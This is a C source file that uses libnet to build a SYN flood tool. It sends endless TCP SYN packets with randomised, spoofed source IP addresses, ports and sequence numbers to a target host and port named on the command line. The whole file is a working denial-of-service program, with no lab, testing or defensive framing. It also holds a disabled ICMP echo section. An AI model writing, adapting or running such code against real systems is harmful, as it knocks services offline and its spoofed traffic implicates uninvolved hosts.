#include <libnet.h>

#define LIBNET_IP_H LIBNET_IPV4_H
#define FLOOD_DELAY 5000 // delay between packet injects by 5000 ms 

/* returns an IP in x.x.x.x notation */
char *print_ip(u_long *ip_addr_ptr) {
   return inet_ntoa( *((struct in_addr *)ip_addr_ptr) );
}


int main(int argc, char *argv[]) {
   u_long dest_ip;
   u_short dest_port;
   u_char errbuf[LIBNET_ERRBUF_SIZE]/*, *packet*/;
   libnet_t *l;    /* libnet context */
   int cnt = 0;

  
	//int network ;
   int opt,byte_count, packet_size = LIBNET_IP_H + LIBNET_TCP_H;

   if(argc < 3)
   {
      printf("Usage:\n%s\t <target host> <target port>\n", argv[0]);
      exit(1);
   }

	l = libnet_init(LIBNET_RAW4, NULL, errbuf);
	if ( l == NULL ) {
		fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
		exit(EXIT_FAILURE);
	}


   dest_ip = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE); // the host 
   dest_port = (u_short) atoi(argv[2]); // the port 


   libnet_seed_prand(l); // seed the random number generator 

   printf("SYN Flooding port %d of %s..\n", dest_port, print_ip(&dest_ip));
   while(1) // loop forever (until break by CTRL-C) 
   {
	   int status;

      status =  libnet_build_tcp(	libnet_get_prand(LIBNET_PRu16), // source TCP port (random) 
									dest_port,                      // destination TCP port 
									libnet_get_prand(LIBNET_PRu32), // sequence number (randomized) 
									libnet_get_prand(LIBNET_PRu32), // acknowledgement number (randomized) 
									TH_SYN,                         // control flags (SYN flag set only) 
									libnet_get_prand(LIBNET_PRu16), // window size (randomized) 
									0,   	// checksum
									0,                              // urgent pointer 
									LIBNET_TCP_H + 0, //tcp packet size
									0,                           // payload (none) 
									0,                              // payload length 
									l,
									0); 
	 if ( status == -1) {
		printf("build tcp error !\n");
		exit(-1);
	 }

 

      status =  libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H,      // size of the packet sans IP header 
											IPTOS_LOWDELAY,                 // IP tos 
											libnet_get_prand(LIBNET_PRu16), // IP ID (randomized) 
											0,                              // frag stuff 
											libnet_get_prand(LIBNET_PR8),   // TTL (randomized) 
											IPPROTO_TCP,                    // transport protocol 
											0, // checksum
											libnet_get_prand(LIBNET_PRu32), // source IP (randomized) 
											dest_ip,                        // destination IP 
											NULL,                           // payload (none) 
											0,                              // payload length 
											l, 0) ;
		if ( status ==-1) {
			printf("build ip error !\n");
		}


#if 0
        /* Building ICMP header */
		char payload[] = "libnet :D";
        u_int16_t seq = 1;
		u_int16_t id = (u_int16_t)libnet_get_prand(LIBNET_PR16);

        if (libnet_build_icmpv4_echo(ICMP_ECHO, 0, 0, id, seq,\
                                (u_int8_t*)payload,sizeof(payload), l, 0) == -1)
        {
                fprintf(stderr, "Error building ICMP header: %s\n",\
                                libnet_geterror(l));
                libnet_destroy(l);
                exit(EXIT_FAILURE);
        }
        
        if ( libnet_autobuild_ipv4(+ LIBNET_ICMPV4_ECHO_H + sizeof(payload), IPPROTO_ICMP, dest_ip, l) == -1 )
        {
                fprintf(stderr, "Error building IP header: %s\n",\
                                libnet_geterror(l));
                libnet_destroy(l);
                exit(EXIT_FAILURE);
        }

#endif

      byte_count = libnet_write(l); // inject packet 
      
      if (byte_count == -1) {
         printf( "Warning: Incomplete packet written.  (%d of %d bytes)\n", byte_count, packet_size);
         printf( "libnet : %s\n", libnet_geterror(l));
         exit(-1);
	   }
	   else {
		  printf( "%d: write packets of %d bytes successfully\n", cnt++, byte_count);
	   }

      usleep(FLOOD_DELAY); // wait for FLOOD_DELAY milliseconds  
      //sleep(1);
      libnet_clear_packet(l);
   }


	libnet_destroy(l);
	

   return 0;
}


